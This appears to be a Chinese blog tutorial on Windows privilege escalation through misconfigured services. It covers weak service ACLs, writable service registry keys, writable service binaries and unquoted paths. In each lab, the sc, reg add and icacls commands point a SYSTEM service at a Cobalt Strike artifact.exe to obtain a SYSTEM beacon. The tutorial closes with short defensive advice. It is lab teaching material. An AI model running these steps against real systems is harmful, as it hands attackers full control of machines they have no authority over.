---
title: "Windows提权-系统服务提权"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# Windows提权-系统服务提权

用户安装的一些软件会在本地注册一些服务，大多数服务在计算机开机时以系统system权限启动，应用软件在注册服务时会在以下路径创建对应注册表项：

~~~regedit
计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
~~~

其中服务的imagepath指向系统服务启动的二进制程序：

![image-20240930160836112](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240930160837846-842417111.png)

这里便产生一种提权的思路：

由于大多数系统服务是system权限启动，如果让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限，达到提权目录

这类提权往往是用户配置不当导致的，接下来分类细说

### 服务配置权限脆弱

windows的系统服务通过ACL来指定用户对其拥有的权限，常见权限如下：

![image-20240930175813059](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240930175814869-440735998.png)

如果目标主机的用户在配置服务时存在疏忽，使低权限用户对高权限下运行的系统服务拥有更改服务配置的权限（SERVICE_CHANGE_CONFIG或SERVICE_ALL_ACCESS），即可通过该低权限用户修改服务启动时的二进制文件路径，通过修改服务启动文件的路径“ binpath”，将其替换为恶意程序的路径，这样服务启动时便会运行恶意程序

存在缺陷的系统服务可以通过[AccessChk](https://learn.microsoft.com/zh-cn/sysinternals/downloads/accesschk)来枚举：

>AccessChk工具可以枚举目标主机上存在权限缺陷的系统服务。AccessChk是微软官方提供的管理工具，常用来枚举或查看系统中指定用户、组对特定资源(包括但不限于文件、文件夹、注册表、全局对象和系统服务等)的访问权限
>
>![image-20241006192809329](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006192808014-1287893979.png)

低权限用户可以检查“Authenticated Users”组和“INTERACTIVE”组对系统服务的权限，前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过身份验证的账户，但不包括来宾账户，后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户，默认情况下，这两个组为计算机本地“Users”组的成员

#### 环境准备

用admin权限配置环境：

* 先建一个服务，名字为Yuy0ung，运行C盘下的1.exe：

  ~~~cmd
  sc create Yuy0ung binpath= "C:\1.exe"
  ~~~

  ![image-20241006182820987](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006182819967-825728272.png)

* 创建一个用户模拟apache：

  ~~~cmd
  net user apache Admin123456 /add
  ~~~

  ![image-20241006184151112](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006184150053-1694018241.png)

* 使用用subinacl（需要自己下载）给服务设置权限：

  ~~~cmd
  subinacl /service Yuy0ung /grant=apache=F
  ~~~

  ![image-20241006184210395](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006184208974-58030882.png)

#### 提权实验

切换到apche用户并用CS实现远控：

![image-20241006191642815](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006191642099-1057898110.png)

* 上传accesschk并枚举是否具有apache用户可更改的服务配置：

  ~~~cmd
  accesschk.exe /accepteula -uwcqv apache *
  ~~~

  ![image-20241006210114114](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006210112841-17790344.png)

  若得到`SERVICE_ALL_ACCESS`或`SERVICE_CHANGE_CONFIG`其中之一，则允许我们配置服务

  **注：**除了accesschk，winpeas也可以枚举出可以修改的服务配置

* 更改Yuy0ung服务的启动文件，替换成恶意的文件（这里我选择使用上传的远控exe）然后提权：

  ~~~cmd
  sc config Yuy0ung binpath= "C:\Users\apache\Desktop\artifact.exe"
  # 注意=后面有个空格
  ~~~

  ![image-20241006192350874](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006192349485-1581005185.png)

* 手动启动服务：

  ~~~cmd
  sc start Yuy0ung
  ~~~

  ![image-20241006192641132](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006192640038-1527749574.png)

  可以看见这里成功接收到了system权限的beacon

### 服务注册表权限脆弱

Windows的服务路径存储在Windows的注册表中，而注册表使用ACL来管理用户对其的访问权限，若ACL配置不当，使低权限用户可以更改注册表的选项的时候，就可以导致提权，可以将 imagepath 修改成恶意的文件，重启导致提权

#### 环境准备

* 新建一个test服务：

  ~~~cmd
  sc create test binpath= "C:\1.exe"
  ~~~

  ![image-20241006212734729](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006212733542-580518136.png)

* 打开注册表给该文件权限，路径为`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\test`：

  ![image-20241006214114407](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006214113482-1878770836.png)

#### 提权实验

依旧切换至apache并使用CS上线：

![image-20241006214428682](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006214427535-131739246.png)

接下来进行信息搜集（可结合winpeas，这里不细说）

* 使用accesschk枚举users具有写入权限的服务注册表：

  ~~~cmd
  shell accesschk.exe /accepteula -uvwqk users HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
  ~~~

  ![image-20241006215101190](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006215100507-418537309.png)

  发现test服务注册表可写

* powershell验证一下：

  ~~~cmd
  powershell Get-Acl -Path "HKLM:SYSTEM\CurrentControlSet\Services\test" | fl
  ~~~

  ![image-20241006221919375](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006221918471-489078520.png)

  users确实有完全控制权限

* 老规矩，imagepath指向的文件替换为远控exe：

  ~~~cmd
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\test" /t REG_EXPAND_SZ
  /v ImagePath /d "C:\Users\apache\Desktop\artifact.exe" /f
  ~~~

  ![image-20241006222801556](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006222800602-1814892526.png)

* 查看服务配置信息：

  ~~~cmd
  sc qc test
  ~~~

  ![image-20241006223200758](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006223159506-200008336.png)

  更改成功了

* 接下来重启服务即可（这里普通用户是没有权限的，需要等待管理员重启电脑）：

  ~~~cmd
  sc start test
  ~~~

  ![image-20241006223622179](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241006223620860-1949445364.png)

  成功获取system权限的beacon

### 服务路径权限脆弱

若主机存在错误配置或操作，使一个低权限用户对此服务调用的二进制文件或其所在目录有写权限，则可以将该文件替换为恶意后门文件，随服务启动继承系统权限

#### 环境准备

首先使用管理员进行配置，创建一个test文件夹`C:\Program Files\test`

* 将test文件夹加入服务：

  ~~~cmd
  sc create svcpath binpath= "\"C:\Program Files\test\1.exe\""
  ~~~

  ![image-20241007194656916](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007194657733-268617894.png)

* 更改test文件夹对users的权限为完全控制：

  ~~~cmd
  icacls "C:\Program Files\test" /grant Users:(OI)(CI)F /T
  ~~~

  ![image-20241007171255166](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007171255921-1133715760.png)

#### 提权实验

切换到apache，并使用CS上线

* 可上传并使用winpeas，查找出弱权限的服务：

  ~~~cmd
  winPEASany.exe quiet notcolor serviceinfo
  ~~~

  ![image-20241007204356057](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007204356841-78798277.png)

  可以发现users对`C:\Program Files\test\1.exe`和`C:\Program Files\test\1.exe`能完全控制

* 直接将1.exe替换成恶意后门，我这里用CS生成的artifact.exe进行替换，等待服务重启即可（依然是需要管理员权限）

  ![image-20241007210400782](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007210401378-653517340.png)

  ![image-20241007210342141](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007210343231-910137073.png)

  成功获取system权限

### 未引用的服务路径

又称Tusted Service Paths，windows服务通常都是以System权限运行的，所以系统在解析服务的二进制文件对应的文件路径中的空格的时候也会以系统权限进行解析。如果我们能利用这一特性，就有机会进行权限提升。

如果在注册表中存在没有被引用起来的服务路径 如果是如下`C:\Program Files\SomeFolder\Service.exe 因为 Program Files 和 Some Folder`都存在空格，就可能存在截断，依次寻找如下的程序并且执行阶段如下：

~~~cmd
C:\Program.exe

C:\Program Files\Some.exe

C:\Program Files\Some Folder\Service.exe
~~~

我们只需要在相应的目录下制作一个恶意的程序，达到提权的目的即可，所以提权的条件如下：

~~~
1、服务路径没有用引号引起来

2、服务的路径中存在空格

3、服务以最高权限启动后

4、具有到对应目录下写文件的权限
~~~

#### 环境准备

* 首先创建一个服务，或者自己安装一个软件，路径中存在空格，并且服务的路径中没有引号

  ~~~cmd
  sc create "service" binpath= "C:\Program Files\Common Files\test\test.exe" start= auto
  ~~~

  ![image-20241007212928849](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007212929684-656258880.png)

* 查询服务的启动方式和权限

  ~~~cmd
  sc qc service
  ~~~

  ![image-20241007213320637](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007213321358-209266436.png)

  是system权限和自启动

* 给users一个写权限：

  ~~~cmd
  icacls "C:" /grant "BUILTIN\Users":W
  ~~~

  ![image-20241007213546961](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007213547647-737356136.png)

#### 提权实验

* 使用winpeas扫描发现未引用的服务：

  ~~~cmd
  winPEASany.exe quiet notcolor serviceinfo
  ~~~

  ![image-20241007222341336](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007222342193-1102668712.png)

* 检查权限：

  ~~~cmd
  icacls "C:"
  icacls "C:\Program Files"
  icacls "C:\Program Files\Common Files"
  ~~~

  ![image-20241007222756168](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007222756981-1995715015.png)

  发现apache用户对C盘有F权限，即完全访问

* 在C盘下创建一个恶意文件Program.exe运行（我同样使用artifact）：

  ![image-20241007230506109](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007230506598-1460755595.png)

* 重启，等待服务自动启动即可上线：

  ![image-20241007230741644](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241007230742290-197600541.png)

  成功获取system权限

### 针对不安全服务提权的防御措施

针对不安全服务的防御措施：

* 正确配置可执行文件权限
* 正确配置注册表权限
* 检查是否存在未被引用的服务文件的路径
* 正确配置环境变量中路径的权限
